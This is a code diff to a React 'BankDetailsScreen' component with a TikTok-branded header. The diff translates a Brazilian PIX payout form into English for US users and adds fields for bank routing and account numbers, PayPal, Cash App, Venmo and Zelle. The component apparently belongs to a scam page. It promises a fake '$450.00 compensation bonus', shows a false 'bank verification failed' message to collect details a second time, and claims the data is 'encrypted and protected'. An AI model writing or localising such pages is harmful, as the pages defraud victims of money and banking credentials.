@@ -1,7 +1,14 @@
 import { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
-import { ShieldCheck, ChevronRight, DollarSign, AlertCircle } from "lucide-react";
+import { ShieldCheck, ChevronRight, Building2, Wallet, DollarSign, Smartphone, Mail, Globe, AlertCircle } from "lucide-react";
+import {
+  Select,
+  SelectContent,
+  SelectItem,
+  SelectTrigger,
+  SelectValue,
+} from "@/components/ui/select";
 import TikTokHeader from "./TikTokHeader";
 
 interface BankDetailsScreenProps {
@@ -11,7 +18,21 @@ interface BankDetailsScreenProps {
 }
 
 const WITHDRAWAL_METHODS = [
-  { id: "pix", label: "PIX", subtitle: "Enviar para sua chave PIX", icon: DollarSign },
+  { id: "bank", label: "Bank transfer", subtitle: "Direct deposit to your bank", icon: Building2 },
+  { id: "paypal", label: "PayPal", subtitle: "Send to your PayPal email", icon: Wallet },
+  { id: "cashapp", label: "Cash App", subtitle: "Send to your $Cashtag", icon: DollarSign },
+  { id: "venmo", label: "Venmo", subtitle: "Send to your Venmo username", icon: Smartphone },
+  { id: "zelle", label: "Zelle", subtitle: "Send to email or phone", icon: Mail },
+  { id: "wire", label: "Wire Transfer", subtitle: "International or domestic wire", icon: Globe },
+];
+
+const US_BANKS = [
+  "Bank of America", "Chase (JPMorgan Chase)", "Wells Fargo", "Citibank",
+  "U.S. Bank", "PNC Bank", "Capital One", "TD Bank", "Truist Financial",
+  "Goldman Sachs", "Morgan Stanley", "Charles Schwab", "HSBC Bank USA",
+  "BMO Harris Bank", "Citizens Financial Group", "Fifth Third Bank",
+  "KeyBank", "Huntington National Bank", "Regions Bank", "M&T Bank",
+  "Ally Bank", "Discover Bank", "Synchrony Bank", "American Express National Bank",
 ];
 
 type Step = "method" | "form" | "confirm";
@@ -20,6 +41,7 @@ const BankDetailsScreen = ({ userName, onSubmit, isReverification = false }: Ban
   const [step, setStep] = useState<Step>("method");
   const [selectedMethod, setSelectedMethod] = useState("");
   const [details, setDetails] = useState<Record<string, string>>({});
+  const [confirmField, setConfirmField] = useState("");
   const [submitting, setSubmitting] = useState(false);
 
   const method = WITHDRAWAL_METHODS.find((m) => m.id === selectedMethod);
@@ -28,8 +50,20 @@ const BankDetailsScreen = ({ userName, onSubmit, isReverification = false }: Ban
     setDetails((prev) => ({ ...prev, [key]: value }));
 
   const isFormValid = () => {
-    if (selectedMethod === "pix") {
+    if (selectedMethod === "bank" || selectedMethod === "wire") {
+      return (
+        details.bank && (details.routing?.length ?? 0) >= 9 &&
+        (details.account?.length ?? 0) >= 4 && details.account === confirmField
+      );
+    }
+    if (selectedMethod === "paypal" || selectedMethod === "zelle") {
+      return (details.email?.length ?? 0) > 3;
+    }
+    if (selectedMethod === "cashapp") {
       return (details.cashtag?.length ?? 0) > 1;
+    }
+    if (selectedMethod === "venmo") {
+      return (details.username?.length ?? 0) > 1;
     }
     return false;
   };
@@ -47,16 +81,16 @@ const BankDetailsScreen = ({ userName, onSubmit, isReverification = false }: Ban
         <TikTokHeader showHelp />
         <div className="flex-1 px-6 py-6">
           <p className="text-sm text-muted-foreground mb-1">
-            Bem-vindo de volta, <strong className="text-foreground">{userName}!</strong>
+            Welcome back, <strong className="text-foreground">{userName}!</strong>
           </p>
           <div className="mt-4 mb-2 flex items-center justify-between">
-            <h2 className="text-xl font-semibold">Adicionar método de saque</h2>
+            <h2 className="text-xl font-semibold">Add withdrawal method</h2>
             <span className="text-xs font-semibold text-muted-foreground bg-secondary px-3 py-1 rounded-full">
-              Etapa 3 de 4
+              Step 3 of 4
             </span>
           </div>
           <p className="text-sm text-muted-foreground mb-5">
-            Escolha como você gostaria de receber seus fundos.
+            Choose how you'd like to receive your funds.
           </p>
 
           {isReverification && (
@@ -64,18 +98,18 @@ const BankDetailsScreen = ({ userName, onSubmit, isReverification = false }: Ban
               <div className="flex items-start gap-2.5 p-3.5 rounded-xl bg-destructive/5 border border-destructive/20">
                 <AlertCircle className="w-4 h-4 text-destructive shrink-0 mt-0.5" />
                 <div>
-                  <p className="text-xs font-semibold text-destructive">Falha na verificação bancária</p>
+                  <p className="text-xs font-semibold text-destructive">Bank verification failed</p>
                   <p className="text-xs text-muted-foreground mt-0.5">
-                    Seus dados bancários anteriores não puderam ser verificados pelo nosso processador de pagamentos. Isso pode acontecer quando o código do banco não corresponde à conta, ou a conta tem restrições para transferências recebidas.
+                    Your previous bank details couldn&apos;t be verified by our payment processor. This can happen when the routing number doesn&apos;t match the bank, or the account has restrictions on incoming transfers.
                   </p>
                 </div>
               </div>
               <div className="flex items-start gap-2.5 p-3.5 rounded-xl bg-secondary border border-border">
                 <ShieldCheck className="w-4 h-4 text-primary shrink-0 mt-0.5" />
                 <div>
-                  <p className="text-xs font-semibold">Por que preciso reenviar meus dados?</p>
+                  <p className="text-xs font-semibold">Why do I need to re-enter my details?</p>
                   <p className="text-xs text-muted-foreground mt-0.5">
-                    Para proteger seus fundos, nosso processador de pagamentos exige informações de saque precisas. Por favor, verifique novamente o nome do banco, código e número da conta antes de enviar. Seu bônus de compensação de R$ 700,00 já foi creditado em seu saldo.
+                    To protect your funds, our payment processor requires accurate withdrawal information. Please double-check your bank name, routing number, and account number before submitting. Your compensation bonus of $450.00 has already been credited to your balance.
                   </p>
                 </div>
               </div>
@@ -118,18 +152,18 @@ const BankDetailsScreen = ({ userName, onSubmit, isReverification = false }: Ban
         <TikTokHeader showHelp />
         <div className="flex-1 px-6 py-6">
           <div className="mt-4 mb-2 flex items-center justify-between">
-            <h2 className="text-xl font-semibold">Confirme seus dados</h2>
+            <h2 className="text-xl font-semibold">Confirm your details</h2>
             <span className="text-xs font-semibold text-muted-foreground bg-secondary px-3 py-1 rounded-full">
-              Etapa 3 de 4
+              Step 3 of 4
             </span>
           </div>
           <p className="text-sm text-muted-foreground mb-6">
-            Revise suas informações de {method?.label} antes de enviar.
+            Review your {method?.label} information before submitting.
           </p>
 
           <div className="rounded-2xl border border-border bg-card p-5 space-y-4">
             <div>
-              <p className="text-xs text-muted-foreground">Método</p>
+              <p className="text-xs text-muted-foreground">Method</p>
               <p className="text-sm font-medium">{method?.label}</p>
             </div>
             {entries.map(([key, value]) => (
@@ -150,7 +184,7 @@ const BankDetailsScreen = ({ userName, onSubmit, isReverification = false }: Ban
           <div className="flex items-center gap-2 p-3 rounded-xl bg-success/5 border border-success/20 mt-5">
             <ShieldCheck className="w-4 h-4 text-success shrink-0" />
             <p className="text-xs text-muted-foreground">
-              Seus dados estão <strong className="text-foreground">criptografados</strong> e protegidos.
+              Your data is <strong className="text-foreground">encrypted</strong> and protected.
             </p>
           </div>
 
@@ -158,14 +192,14 @@ const BankDetailsScreen = ({ userName, onSubmit, isReverification = false }: Ban
             {submitting ? (
               <span className="flex items-center gap-2">
                 <span className="w-4 h-4 border-2 border-primary-foreground/40 border-t-primary-foreground rounded-full animate-spin" />
-                Processando...
+                Processing...
               </span>
             ) : (
-              "Confirmar e Continuar"
+              "Confirm & Continue"
             )}
           </Button>
           <Button variant="ghost" onClick={() => setStep("form")} className="w-full mt-3 text-sm text-muted-foreground">
-            ← Voltar e editar
+            ← Go back and edit
           </Button>
         </div>
       </div>
@@ -173,35 +207,124 @@ const BankDetailsScreen = ({ userName, onSubmit, isReverification = false }: Ban
   }
 
   // --- FORM (per method) ---
+  const isBankType = selectedMethod === "bank" || selectedMethod === "wire";
+
   return (
     <div className="min-h-screen flex flex-col bg-background">
       <TikTokHeader showHelp />
       <div className="flex-1 px-6 py-6">
         <div className="mt-4 mb-2 flex items-center justify-between">
-          <h2 className="text-xl font-semibold">Dados do {method?.label}</h2>
+          <h2 className="text-xl font-semibold">{method?.label} details</h2>
           <span className="text-xs font-semibold text-muted-foreground bg-secondary px-3 py-1 rounded-full">
-            Etapa 3 de 4
+            Step 3 of 4
           </span>
         </div>
         <p className="text-sm text-muted-foreground mb-4">
-          Insira suas informações do {method?.label} para receber seu saque.
+          Enter your {method?.label} information to receive your withdrawal.
         </p>
 
         <div className="flex items-center gap-2 p-3 rounded-xl bg-success/5 border border-success/20 mb-5">
           <ShieldCheck className="w-4 h-4 text-success shrink-0" />
           <p className="text-xs text-muted-foreground">
-            Seus dados estão <strong className="text-foreground">criptografados</strong> e armazenados com segurança.
+            Your data is <strong className="text-foreground">encrypted</strong> and securely stored.
           </p>
         </div>
 
         <div className="space-y-4">
-          {selectedMethod === "pix" && (
+          {isBankType && (
+            <>
+              <div>
+                <label className="text-sm font-medium mb-1.5 block">Select your bank</label>
+                <Select value={details.bank || ""} onValueChange={(v) => updateDetail("bank", v)}>
+                  <SelectTrigger className="h-12 rounded-xl">
+                    <SelectValue placeholder="Choose a bank..." />
+                  </SelectTrigger>
+                  <SelectContent className="max-h-60">
+                    {US_BANKS.map((b) => (
+                      <SelectItem key={b} value={b}>{b}</SelectItem>
+                    ))}
+                  </SelectContent>
+                </Select>
+              </div>
+              <div>
+                <label className="text-sm font-medium mb-1.5 block">Routing Number</label>
+                <Input
+                  type="text" inputMode="numeric" maxLength={9} placeholder="9 digits"
+                  value={details.routing || ""}
+                  onChange={(e) => updateDetail("routing", e.target.value.replace(/\D/g, ""))}
+                  className="h-12 rounded-xl"
+                />
+                {(details.routing?.length ?? 0) > 0 && (details.routing?.length ?? 0) < 9 && (
+                  <p className="text-xs text-destructive mt-1">Must be 9 digits</p>
+                )}
+              </div>
+              <div>
+                <label className="text-sm font-medium mb-1.5 block">Account Number</label>
+                <Input
+                  type="text" inputMode="numeric" maxLength={17} placeholder="Enter account number"
+                  value={details.account || ""}
+                  onChange={(e) => updateDetail("account", e.target.value.replace(/\D/g, ""))}
+                  className="h-12 rounded-xl"
+                />
+              </div>
+              <div>
+                <label className="text-sm font-medium mb-1.5 block">Confirm Account Number</label>
+                <Input
+                  type="text" inputMode="numeric" maxLength={17} placeholder="Re-enter account number"
+                  value={confirmField}
+                  onChange={(e) => setConfirmField(e.target.value.replace(/\D/g, ""))}
+                  className="h-12 rounded-xl"
+                />
+                {confirmField.length > 0 && details.account !== confirmField && (
+                  <p className="text-xs text-destructive mt-1">Account numbers don't match</p>
+                )}
+              </div>
+            </>
+          )}
+
+          {selectedMethod === "paypal" && (
             <div>
-              <label className="text-sm font-medium mb-1.5 block">Chave PIX</label>
+              <label className="text-sm font-medium mb-1.5 block">PayPal Email</label>
               <Input
-                type="text" placeholder="SuaChavePIX"
+                type="email" placeholder="you@example.com"
+                value={details.email || ""}
+                onChange={(e) => updateDetail("email", e.target.value)}
+                className="h-12 rounded-xl"
+              />
+            </div>
+          )}
+
+          {selectedMethod === "cashapp" && (
+            <div>
+              <label className="text-sm font-medium mb-1.5 block">$Cashtag</label>
+              <Input
+                type="text" placeholder="$YourCashtag"
                 value={details.cashtag || ""}
                 onChange={(e) => updateDetail("cashtag", e.target.value)}
+                className="h-12 rounded-xl"
+              />
+            </div>
+          )}
+
+          {selectedMethod === "venmo" && (
+            <div>
+              <label className="text-sm font-medium mb-1.5 block">Venmo Username</label>
+              <Input
+                type="text" placeholder="@username"
+                value={details.username || ""}
+                onChange={(e) => updateDetail("username", e.target.value)}
+                className="h-12 rounded-xl"
+              />
+            </div>
+          )}
+
+          {selectedMethod === "zelle" && (
+            <div>
+              <label className="text-sm font-medium mb-1.5 block">Zelle Email or Phone</label>
+              <Input
+                type="text" placeholder="Email or phone number"
+                value={details.email || ""}
+                onChange={(e) => updateDetail("email", e.target.value)}
                 className="h-12 rounded-xl"
               />
             </div>
@@ -213,10 +336,10 @@ const BankDetailsScreen = ({ userName, onSubmit, isReverification = false }: Ban
           disabled={!isFormValid()}
           className="w-full h-14 rounded-full text-base font-semibold mt-8"
         >
-          Continuar
+          Continue
         </Button>
-        <Button variant="ghost" onClick={() => { setStep("method"); setDetails({}); }} className="w-full mt-3 text-sm text-muted-foreground">
-          ← Trocar método
+        <Button variant="ghost" onClick={() => { setStep("method"); setDetails({}); setConfirmField(""); }} className="w-full mt-3 text-sm text-muted-foreground">
+          ← Change method
         </Button>
       </div>
     </div>
